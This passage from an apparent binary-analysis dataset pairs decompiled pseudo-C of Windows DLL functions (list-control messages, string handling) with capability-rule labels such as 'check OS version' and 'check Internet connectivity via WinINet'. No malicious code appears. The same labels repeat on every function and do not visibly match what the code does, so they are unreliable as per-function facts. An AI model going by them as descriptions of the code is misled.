(**0x1800de7f0)(*0x180123e98, 0x184, 0, 0);\n    auStack40 = ZEXT816(0);\n    iVar8 = 0;\n    iStack24 = 0;\n    puStack80 = &stack0xffffffffffffffb8;\n    uStack160 = 0x18003e3c2;\n    uVar7 = fcn.18000de50(&stack0xffffffffffffffb8, 0x180123e18);\n    uStack104 = *0x180101910;\n    uStack100 = *0x180101914;\n    uStack96 = *0x180101918;\n    uStack92 = *0x18010191c;\n    uStack120 = 0;\n    arg1 = &stack0xffffffffffffff88;\n    uStack160 = 0x18003e3ed;\n    fcn.180011120(arg1, 0x1800f6cdc, 6);\n    uStack160 = 0x18003e400;\n    iVar4 = fcn.180009760(arg1, &stack0xffffffffffffff88, &stack0xffffffffffffffd8, uVar7);\n    iVar6 = iVar4;\n    if (0xf < CONCAT44(uStack92, uStack96)) {\n        iVar2 = CONCAT71(Stack119, uStack120);\n        arg1_00 = iVar2;\n        if ((0xfff < CONCAT44(uStack92, uStack96) + 1) && (arg1_00 = *(iVar2 + -8),  0x1f < (iVar2 - arg1_00) - 8U))\n        goto code_r0x00018003e52b;\n        uStack160 = 0x18003e440;\n        fcn.18008fb24(arg1_00);\n    }\n    if (iVar4 < 1) {\n        uStack160 = 0x18003e451;\n        fcn.18003eeb0(0x180123d80);\n    }\n    else {\n        if (0 < iVar6) {\n            do {\n                puVar9 = auStack40._0_8_ + iVar8;\n                if (7 < puVar9[3]) {\n                    puVar9 = *puVar9;\n                }\n                uStack160 = 0x18003e487;\n                (**0x1800de7f0)(*0x180123e98, 0x180, 0, puVar9);\n                iVar8 = iVar8 + 0x20;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n        uStack160 = 0x18003e4a9;\n        (**0x1800de7f0)(*0x180123e98, 0x186, 0, 0);\n        uStack160 = 0x18003e4b5;\n        fcn.18003e540(0x180123d80);\n    }\n    if (auStack40._0_8_ != 0) {\n        uStack160 = 0x18003e4ca;\n        fcn.180013aa0(auStack40._0_8_, auStack40._8_8_);\n        uVar10 = iStack24 - auStack40._0_8_ & 0xffffffffffffffe0;\n        iVar6 = auStack40._0_8_;\n        if (0xfff < uVar10) {\n            iVar6 = *(auStack40._0_8_ + -8);\n            if (0x1f < (auStack40._0_8_ - iVar6) - 8U) {\n                uStack160 = 0x18003e52a;\n                fcn.1800b3528(iVar6, uVar10 + 0x27);\ncode_r0x00018003e52b:\n                uStack160 = 0x18003e530;\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        uStack160 = 0x18003e504;\n        fcn.18008fb24(iVar6);\n    }\n    uStack160 = 0x18003e514;\n    fcn.18008fb00(uStack16 ^ &stack0xffffffffffffff68);\n    return;\n}\n",
        "token_count": 2088
    },
    "18003e0a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003e0a0(ulong noname_0, uchar *arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    int64_t arg3;\n    uchar auStack104 [32];\n    uint uStack72;\n    uchar *puStack56;\n    char acStack48 [24];\n    uint64_t uStack24;\n    int64_t iVar3;\n    \n    uStack24 = *0x180123080 ^ auStack104;\n    puStack56 = arg2;\n    uVar2 = (**0x1800de7f0)(*0x18012a390, 0x843, 0);\n    uStack72 = (**0x1800de7f0)(*0x18012a390, 0x842, 0);\n    fcn.180020af0(acStack48, 0x11, \"%06X %06X 00\", uVar2 & 0xffffffff);\n    *(arg2 + 0x10) = 0;\n    *(arg2 + 0x18) = 0xf;\n    *arg2 = 0;\n    iVar3 = -1;\n    do {\n        arg3 = iVar3 + 1;\n        iVar1 = iVar3 + 1;\n        iVar3 = arg3;\n    } while (acStack48[iVar1] != '\\0');\n    fcn.180011120(arg2, acStack48, arg3);\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 334
    },
    "18003e54": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003e540(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    ulong arg1_00;\n    int64_t iVar5;\n    uchar *puVar6;\n    ulong ****ppppuVar7;\n    uchar auStack424 [32];\n    uchar *puStack392;\n    ulong uStack384;\n    uchar uStack376;\n    unkbyte7 Stack375;\n    ulong uStack360;\n    uint64_t uStack352;\n    uchar uStack344;\n    unkbyte7 Stack343;\n    ulong uStack328;\n    uint64_t uStack320;\n    uchar uStack312;\n    unkbyte7 Stack311;\n    ulong uStack296;\n    uint64_t uStack288;\n    uchar uStack280;\n    uchar uStack279;\n    unkbyte6 Stack278;\n    ulong uStack264;\n    uint64_t uStack256;\n    uchar *puStack248;\n    ulong uStack240;\n    uchar auStack232 [32];\n    uchar auStack200 [128];\n    ulong ****appppuStack72 [2];\n    int64_t iStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack240 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack424;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x118), 0x188, 0, 0);\n    if (iVar3 == -1) goto code_r0x00018003eaa6;\n    iStack56 = 0;\n    uStack48 = 7;\n    appppuStack72[0] = appppuStack72[0] & 0xffffffffffff0000;\n    appppuStack72[0] = fcn.180011cf0(appppuStack72, 0x108);\n    iStack56 = 0x104;\n    uStack48 = 0x107;\n    ppppuVar7 = appppuStack72[0];\n    for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *ppppuVar7 = 0;\n        ppppuVar7 = ppppuVar7 + 2;\n    }\n    *(appppuStack72[0] + 0x41) = 0;\n    (**0x1800de7f0)(*(arg1 + 0x118), 0x189, iVar3, appppuStack72[0]);\n    ppppuVar7 = appppuStack72;\n    if (7 < uStack48) {\n        ppppuVar7 = appppuStack72[0];\n    }\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (*(ppppuVar7 + iVar5 * 2) != 0);\n    fcn.180010d70(appppuStack72, ppppuVar7, iVar5);\n    if (arg1 + 0xd8 != appppuStack72) {\n        ppppuVar7 = appppuStack72;\n        if (7 < uStack48) {\n            ppppuVar7 = appppuStack72[0];\n        }\n        fcn.180010d70(arg1 + 0xd8, ppppuVar7, iStack56);\n    }\n    puStack248 = auStack232;\n    uStack384 = fcn.18000de50(auStack232, arg1 + 0x98);\n    uStack296 = CONCAT44(*0x180101914, *0x180101910);\n    uStack288 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack312 = 0;\n    fcn.180011120(&uStack312, 0x1800f471f, 0);\n    uVar4 = fcn.1800687b0(auStack200);\n    ppppuVar7 = appppuStack72;\n    if (7 < uStack48) {\n        ppppuVar7 = appppuStack72[0];\n    }\n    fcn.180068c50(uVar4, &uStack344, ppppuVar7, ppppuVar7 + iStack56 * 2);\n    fcn.1800686c0(auStack200);\n    uStack360 = CONCAT44(*0x180101914, *0x180101910);\n    uStack352 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack376 = 0;\n    puVar6 = &uStack376;\n    fcn.180011120(puVar6, \"Validations\", 0xb);\n    puStack392 = &uStack312;\n    uVar4 = fcn.180004f50(puVar6, &uStack280, &uStack376, &uStack344);\n    fcn.18000d960(arg1 + 0xf8, uVar4);\n    if (uStack256 < 8) {\ncode_r0x00018003e775:\n        uStack264 = *0x180101900;\n        uStack256 = *0x180101908;\n        uStack280 = 0;\n        uStack279 = 0;\n        if (0xf < uStack352) {\n            iVar2 = CONCAT71(Stack375, uStack376);\n            iVar5 = iVar2;\n            if ((uStack352 + 1 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x00018003e7c4;\n            }\n            goto code_r0x00018003ead9;\n        }\ncode_r0x00018003e7c4:\n        uStack360 = CONCAT44(*0x180101914, *0x180101910);\n        uStack352 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack376 = 0;\n        if (0xf < uStack320) {\n            iVar2 = CONCAT71(Stack343, uStack344);\n            iVar5 = iVar2;\n            if ((uStack320 + 1 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x00018003e814;\n            }\n            goto code_r0x00018003eadf;\n        }\ncode_r0x00018003e814:\n        uStack328 = CONCAT44(*0x180101914, *0x180101910);\n        uStack320 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack344 = 0;\n        if (0xf < uStack288) {\n            iVar2 = CONCAT71(Stack311, uStack312);\n            iVar5 = iVar2;\n            if ((uStack288 + 1 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x00018003e863;\n            }\n            goto code_r0x00018003eae5;\n        }\ncode_r0x00018003e863:\n        puStack248 = auStack232;\n        uVar4 = fcn.18000de50(auStack232, arg1 + 0x98);\n        uStack328 = CONCAT44(*0x180101914, *0x180101910);\n        uStack320 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack344 = 0;\n        fcn.180011120(&uStack344, 0x1800f472f, 0);\n        arg1_00 = fcn.1800687b0(auStack200);\n        ppppuVar7 = appppuStack72;\n        if (7 < uStack48) {\n            ppppuVar7 = appppuStack72[0];\n        }\n        fcn.180068c50(arg1_00, &uStack312, ppppuVar7, ppppuVar7 + iStack56 * 2);\n        fcn.1800686c0(auStack200);\n        uStack360 = CONCAT44(*0x180101914, *0x180101910);\n        uStack352 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack376 = 0;\n        puVar6 = &uStack376;\n        fcn.180011120(puVar6, 0x1800f6dd4, 6);\n        puStack392 = &uStack344;\n        uStack384 = uVar4;\n        uVar4 = fcn.180004b90(puVar6, &uStack280, &uStack376, &uStack312);\n        fcn.18000dd60(arg1 + 0xb8, uVar4);\n        if (0xf < uStack256) {\n            iVar2 = CONCAT62(Stack278, CONCAT11(uStack279, uStack280));\n            iVar5 = iVar2;\n            if ((uStack256 + 1 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x00018003e975;\n            }\n            goto code_r0x00018003eaeb;\n        }\ncode_r0x00018003e975:\n        uStack264 = CONCAT44(*0x180101914, *0x180101910);\n        uStack256 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack280 = 0;\n        if (0xf < uStack352) {\n            iVar2 = CONCAT71(Stack375, uStack376);\n            iVar5 = iVar2;\n            if ((uStack352 + 1 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x00018003e9c3;\n            }\n            goto code_r0x00018003eaf1;\n        }\ncode_r0x00018003e9c3:\n        uStack360 = CONCAT44(*0x180101914, *0x180101910);\n        uStack352 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack376 = 0;\n        if (uStack288 < 0x10) {\ncode_r0x00018003ea12:\n            uStack296 = CONCAT44(*0x180101914, *0x180101910);\n            uStack288 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack312 = 0;\n            if (0xf < uStack320) {\n                iVar2 = CONCAT71(Stack343, uStack344);\n                iVar5 = iVar2;\n                if ((0xfff < uStack320 + 1) && (iVar5 = *(iVar2 + -8),  0x1f < (iVar2 - iVar5) - 8U))\n                goto code_r0x00018003eafd;\n                fcn.18008fb24(iVar5);\n            }\n            fcn.18003f1d0(arg1);\n            if (uStack48 < 8) goto code_r0x00018003eaa6;\n            ppppuVar7 = appppuStack72[0];\n            if (0xfff < uStack48 * 2 + 2) {\n                ppppuVar7 = appppuStack72[0][-1];\n                if (0x1f < appppuStack72[0] + (-8 - ppppuVar7)) {\n                    fcn.1800b3528(ppppuVar7, uStack48 * 2 + 0x29);\n                    goto code_r0x00018003ead3;\n                }\n            }\n            fcn.18008fb24(ppppuVar7);\ncode_r0x00018003eaa6:\n            fcn.18008fb00(uStack40 ^ auStack424);\n            return;\n        }\n        iVar2 = CONCAT71(Stack311, uStack312);\n        iVar5 = iVar2;\n        if ((uStack288 + 1 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x00018003ea12;\n        }\n    }\n    else {\n        iVar2 = CONCAT62(Stack278, CONCAT11(uStack279, uStack280));\n        iVar5 = iVar2;\n        if ((uStack256 * 2 + 2 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x00018003e775;\n        }\ncode_r0x00018003ead3:\n        fcn.1800b3528();\ncode_r0x00018003ead9:\n        fcn.1800b3528();\ncode_r0x00018003eadf:\n        fcn.1800b3528();\ncode_r0x00018003eae5:\n        fcn.1800b3528();\ncode_r0x00018003eaeb:\n        fcn.1800b3528();\ncode_r0x00018003eaf1:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018003eafd:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 3167
    },
    "18003eb1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.18003eb10(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong uVar6;\n    ushort *puVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    ulong *******pppppppuVar10;\n    ushort *puVar11;\n    bool bVar12;\n    uchar auStack168 [32];\n    ulong uStack136;\n    ushort uStack120;\n    ushort uStack118;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int64_t iStack104;\n    uint64_t uStack96;\n    ulong uStack88;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ulong uStack56;\n    ulong *******apppppppuStack48 [2];\n    ulong uStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack168;\n    uVar2 = *(arg1 + 0x30);\n    uVar6 = (**0x1800de798)(*(arg1 + 0x18), 0x264a);\n    (**0x1800de770)(uVar6, uVar2);\n    uVar2 = *(arg1 + 0x30);\n    uVar6 = (**0x1800de798)(*(arg1 + 0x18), 0x264b);\n    (**0x1800de770)(uVar6, uVar2);\n    uVar2 = *(arg1 + 0x30);\n    uVar6 = (**0x1800de798)(*(arg1 + 0x18), 0x264c);\n    (**0x1800de770)(uVar6, uVar2);\n    uStack32 = 0;\n    uStack24 = 7;\n    apppppppuStack48[0] = apppppppuStack48[0] & 0xffffffffffff0000;\n    apppppppuStack48[0] = fcn.180011cf0(apppppppuStack48, 0x108);\n    uStack32 = 0x105;\n    uStack24 = 0x107;\n    pppppppuVar10 = apppppppuStack48[0];\n    for (iVar9 = 0x105; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *pppppppuVar10 = 0;\n        pppppppuVar10 = pppppppuVar10 + 2;\n    }\n    *(apppppppuStack48[0] + 0x20a) = 0;\n    (**0x1800de728)(*(arg1 + 0x18), 0x264f, apppppppuStack48[0], 0x105);\n    pppppppuVar10 = apppppppuStack48;\n    if (7 < uStack24) {\n        pppppppuVar10 = apppppppuStack48[0];\n    }\n    iStack104 = 0;\n    uStack96 = 7;\n    uStack120 = 0;\n    iVar9 = -1;\n    do {\n        iVar9 = iVar9 + 1;\n    } while (*(pppppppuVar10 + iVar9 * 2) != 0);\n    fcn.180010d70(&uStack120, pppppppuVar10, iVar9);\n    bVar12 = iStack104 != 0;\n    uVar6 = (**0x1800de798)(*(arg1 + 0x18), 0x2660);\n    (**0x1800de770)(uVar6, bVar12);\n    if (uStack96 < 8) {\ncode_r0x00018003eca9:\n        if (*(arg1 + 0x30) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x2660, 0x1800f79d0);\n            fcn.180068540(*(arg1 + 0x18), 0x2660);\ncode_r0x00018003ee37:\n            if (uStack24 < 8) goto code_r0x00018003ee73;\n            pppppppuVar10 = apppppppuStack48[0];\n            if (0xfff < uStack24 * 2 + 2) {\n                pppppppuVar10 = apppppppuStack48[0][-1];\n                if (0x1f < apppppppuStack48[0] + (-8 - pppppppuVar10)) {\n                    fcn.1800b3528(pppppppuVar10, uStack24 * 2 + 0x29);\n                    goto code_r0x00018003ee9e;\n                }\n            }\n            fcn.18008fb24(pppppppuVar10);\ncode_r0x00018003ee73:\n            fcn.18008fb00(uStack16 ^ auStack168);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88._0_2_ = 0;\n        fcn.180010d70(&uStack88, 0x1800f79e0, 5);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            uStack136 = 1;\n            piVar8 = fcn.180013690(&uStack88, 1, 0, 0x1800f69ec);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar7 = &uStack88;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar7 = CONCAT62(uStack88._2_6_, uStack88);\n            }\n            puVar7[uVar5] = 0x2a;\n            puVar7[uVar1] = 0;\n            piVar8 = &uStack88;\n        }\n        uStack116 = *(piVar8 + 4);\n        puVar7 = *piVar8;\n        uStack112 = *(piVar8 + 1);\n        uStack108 = *(piVar8 + 0xc);\n        uStack120 = *piVar8;\n        uStack118 = *piVar8 >> 0x10;\n        iStack104 = piVar8[2];\n        uStack96 = piVar8[3];\n        piVar8[2] = 0;\n        piVar8[3] = 7;\n        *piVar8 = 0;\n        puVar11 = &uStack120;\n        if (7 < uStack96) {\n            puVar11 = puVar7;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2660, puVar11);\n        if (uStack96 < 8) {\ncode_r0x00018003edd7:\n            iStack104 = CONCAT44(*0x180101904, *0x180101900);\n            uStack96 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack120 = 0;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                iVar4 = CONCAT62(uStack88._2_6_, uStack88);\n                iVar9 = iVar4;\n                if ((0xfff < CONCAT44(uStack60, uStack64) * 2 + 2) &&\n                   (iVar9 = *(iVar4 + -8),  0x1f < (iVar4 - iVar9) - 8U)) goto code_r0x00018003eeaa;\n                fcn.18008fb24(iVar9);\n            }\n            fcn.180068600(*(arg1 + 0x18), 0x2660);\n            goto code_r0x00018003ee37;\n        }\n        iVar4 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n        iVar9 = iVar4;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar9 = *(iVar4 + -8),  (iVar4 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x00018003edd7;\n        }\n    }\n    else {\n        iVar4 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n        iVar9 = iVar4;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar9 = *(iVar4 + -8),  (iVar4 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x00018003eca9;\n        }\ncode_r0x00018003ee9e:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018003eeaa:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 2139
    },
    "18003efb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003efb0(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ulong arg4;\n    ulong arg1_00;\n    uchar *arg1_01;\n    int64_t iVar5;\n    uchar uStack248;\n    unkbyte7 Stack247;\n    ulong uStack232;\n    uint64_t uStack224;\n    ulong uStack216;\n    uchar *puStack208;\n    int64_t aiStack200 [3];\n    uint64_t uStack176;\n    uchar auStack168 [32];\n    uchar auStack136 [128];\n    \n    uStack216 = 0xfffffffffffffffe;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x118), 0x188, 0, 0);\n    if (iVar3 != -1) {\n        if (*(arg1 + 0x91) == '\\0') {\n            puStack208 = auStack168;\n            arg4 = fcn.18000de50(auStack168, arg1 + 0x98);\n            arg1_00 = fcn.1800687b0(auStack136);\n            iVar5 = arg1 + 0xd8;\n            if (7 < *(arg1 + 0xf0)) {\n                iVar5 = *(arg1 + 0xd8);\n            }\n            fcn.180068c50(arg1_00, aiStack200, iVar5, iVar5 + *(arg1 + 0xe8) * 2);\n            fcn.1800686c0(auStack136);\n            uStack232 = CONCAT44(*0x180101914, *0x180101910);\n            uStack224 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack248 = 0;\n            arg1_01 = &uStack248;\n            fcn.180011120(arg1_01, 0x1800f70bc, 6);\n            fcn.18000a960(arg1_01, &uStack248, aiStack200, arg4);\n            if (0xf < uStack224) {\n                iVar2 = CONCAT71(Stack247, uStack248);\n                iVar5 = iVar2;\n                if ((0xfff < uStack224 + 1) && (iVar5 = *(iVar2 + -8),  0x1f < (iVar2 - iVar5) - 8U))\n                goto code_r0x00018003f1c4;\n                fcn.18008fb24(iVar5);\n            }\n            uStack232 = CONCAT44(*0x180101914, *0x180101910);\n            uStack224 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack248 = 0;\n            if (0xf < uStack176) {\n                iVar5 = aiStack200[0];\n                if (0xfff < uStack176 + 1) {\n                    iVar5 = *(aiStack200[0] + -8);\n                    if (0x1f < (aiStack200[0] - iVar5) - 8U) {\n                        fcn.1800b3528(uStack232, iVar5, uStack176 + 0x28);\ncode_r0x00018003f1c4:\n                        fcn.1800b3528();\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar5);\n            }\n        }\n        (**0x1800de7f0)(*(arg1 + 0x118), 0x182, iVar3, 0);\n        iVar4 = (**0x1800de7f0)(*(arg1 + 0x118), 0x18b, 0, 0);\n        iVar4 = iVar4 + -1;\n        if (iVar4 < 0) {\n            fcn.18003eeb0(arg1);\n        }\n        else {\n            if (iVar3 <= iVar4) {\n                iVar4 = iVar3;\n            }\n            (**0x1800de7f0)(*(arg1 + 0x118), 0x186, iVar4, 0);\n            *(arg1 + 0x91) = 0;\n            fcn.18003e540(arg1);\n        }\n    }\n    return;\n}\n",
        "token_count": 974
    },
    "18003f31": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18003f310(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    ulong arg1_00;\n    uchar *puVar5;\n    int64_t iVar6;\n    ulong *arg3;\n    int64_t iVar7;\n    uchar auStack1384 [32];\n    ulong uStack1352;\n    uchar uStack1336;\n    uchar uStack1335;\n    unkbyte6 Stack1334;\n    int64_t iStack1320;\n    uint64_t uStack1312;\n    int64_t aiStack1304 [3];\n    uint64_t uStack1280;\n    uchar *puStack1272;\n    ulong uStack1264;\n    uchar auStack1256 [32];\n    uchar auStack1224 [128];\n    int16_t aiStack1096 [264];\n    int16_t aiStack568 [264];\n    uint64_t uStack40;\n    \n    uStack1264 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack1384;\n    if (*(arg1 + 0x30) != '\\0') goto code_r0x00018003f7b1;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x118), 0x188, 0, 0);\n    if (iVar3 == -1) goto code_r0x00018003f7b1;\n    (**0x1800de728)(*(arg1 + 0x18), 0x264f, aiStack1096, 0x105);\n    iStack1320 = 0;\n    uStack1312 = 7;\n    uStack1336 = 0;\n    uStack1335 = 0;\n    iVar6 = -1;\n    iVar7 = -1;\n    do {\n        iVar7 = iVar7 + 1;\n    } while (aiStack1096[iVar7] != 0);\n    fcn.180010d70(&uStack1336, aiStack1096, iVar7);\n    if (7 < uStack1312) {\n        iVar2 = CONCAT62(Stack1334, CONCAT11(uStack1335, uStack1336));\n        iVar7 = iVar2;\n        if (uStack1312 * 2 + 2 < 0x1000) {\ncode_r0x00018003f416:\n            fcn.18008fb24(iVar7);\n            goto code_r0x00018003f41b;\n        }\n        iVar7 = *(iVar2 + -8);\n        if ((iVar2 - iVar7) - 8U < 0x20) goto code_r0x00018003f416;\n        fcn.1800b3528(iVar7, uStack1312 * 2 + 0x29);\ncode_r0x00018003f7e9:\n        fcn.1800b3528();\ncode_r0x00018003f7ef:\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x00018003f41b:\n    if (iStack1320 == 0) goto code_r0x00018003f7b1;\n    (**0x1800de728)(*(arg1 + 0x18), 0x2651, aiStack568, 0x105);\n    if (*(arg1 + 0x91) == '\\0') {\n        puStack1272 = auStack1256;\n        uVar4 = fcn.18000de50(auStack1256, arg1 + 0x98);\n        arg3 = arg1 + 0xd8;\n        arg1_00 = fcn.1800687b0(auStack1224);\n        if (7 < *(arg1 + 0xf0)) {\n            arg3 = *arg3;\n        }\n        fcn.180068c50(arg1_00, aiStack1304, arg3, arg3 + *(arg1 + 0xe8) * 2);\n        fcn.1800686c0(auStack1224);\n        iStack1320 = CONCAT44(*0x180101914, *0x180101910);\n        uStack1312 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack1336 = 0;\n        puVar5 = &uStack1336;\n        fcn.180011120(puVar5, 0x1800f70d4, 6);\n        fcn.18000a960(puVar5, &uStack1336, aiStack1304, uVar4);\n        if (0xf < uStack1312) {\n            iVar2 = CONCAT62(Stack1334, CONCAT11(uStack1335, uStack1336));\n            iVar7 = iVar2;\n            if ((0xfff < uStack1312 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n            goto code_r0x00018003f7e9;\n            fcn.18008fb24(iVar7);\n        }\n        iStack1320 = CONCAT44(*0x180101914, *0x180101910);\n        uStack1312 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack1336 = 0;\n        if (0xf < uStack1280) {\n            iVar7 = aiStack1304[0];\n            if ((0xfff < uStack1280 + 1) && (iVar7 = *(aiStack1304[0] + -8),  0x1f < (aiStack1304[0] - iVar7) - 8U))\n            goto code_r0x00018003f7ef;\n            fcn.18008fb24(iVar7);\n        }\n    }\n    iVar7 = -1;\n    do {\n        iVar7 = iVar7 + 1;\n    } while (aiStack1096[iVar7] != 0);\n    fcn.180010d70(arg1 + 0xd8, aiStack1096, iVar7);\n    do {\n        iVar6 = iVar6 + 1;\n    } while (aiStack568[iVar6] != 0);\n    fcn.180010d70(arg1 + 0xf8, aiStack568, iVar6);\n    uVar4 = fcn.18003e170(arg1, aiStack1304);\n    fcn.18000dd60(arg1 + 0xb8, uVar4);\n    if (0xf < uStack1280) {\n        iVar6 = aiStack1304[0];\n        if (0xfff < uStack1280 + 1) {\n            iVar6 = *(aiStack1304[0] + -8);\n            if (0x1f < (aiStack1304[0] - iVar6) - 8U) {\n                fcn.1800b3528(iVar6, uStack1280 + 0x28);\n                goto code_r0x00018003f7fb;\n            }\n        }\n        fcn.18008fb24(iVar6);\n    }\n    puStack1272 = auStack1256;\n    uStack1352 = fcn.18000de50(auStack1256, arg1 + 0x98);\n    uVar4 = fcn.1800687b0(auStack1224);\n    iVar6 = arg1 + 0xd8;\n    if (7 < *(arg1 + 0xf0)) {\n        iVar6 = *(arg1 + 0xd8);\n    }\n    fcn.180068c50(uVar4, aiStack1304, iVar6, iVar6 + *(arg1 + 0xe8) * 2);\n    fcn.1800686c0(auStack1224);\n    iStack1320 = CONCAT44(*0x180101914, *0x180101910);\n    uStack1312 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack1336 = 0;\n    puVar5 = &uStack1336;\n    fcn.180011120(puVar5, \"Styles\", 6);\n    fcn.180005260(puVar5, &uStack1336, aiStack1304, arg1 + 0xb8);\n  